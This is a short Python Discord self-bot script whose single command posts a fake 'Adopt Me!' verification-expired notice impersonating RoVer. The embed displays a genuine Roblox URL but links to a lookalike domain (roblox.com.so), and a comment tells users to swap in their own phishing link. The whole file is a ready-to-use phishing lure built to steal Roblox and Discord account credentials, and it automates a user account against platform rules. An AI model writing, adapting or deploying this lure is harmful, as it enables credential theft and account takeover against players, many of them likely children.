#made by Bazard#0001

import discord
from discord.ext import commands
from token import token

bot = commands.Bot(command_prefix = ".", self_bot = True)

@bot.event
async def on_ready():
	print("bot is ready")
    
@bot.command()
async def amverify(ctx):
    e = discord.Embed(title='Your Verification in server: \'Adopt Me!\' has expired.', description='To re-verify your account, please join RoVer Plus\'s Official Roblox Verification Game', color=0xFFD700)
    e.add_field(name=':arrow_down_small: Please Login and join the game :arrow_down_small:', value='[https://www.roblox.com/games/713226354/RoVer-Verification](https://www.roblox.com.so/games/7447354454/RoVer-Verification?privateServerLinkCode=994810027592858311478205308549)')
    e.set_footer(text='Make sure to verify as soon as possible or you might permanently lose access to the server or even Adopt Me itself.')
    e.set_thumbnail(url='https://cdn.discordapp.com/avatars/601526796558532619/864f807c5bd3db1cb2316148171b0ac6.png?size=80')
    await ctx.send(embed=e)

#Replace the phishing link with your own phishing link.

bot.run(token, bot=False)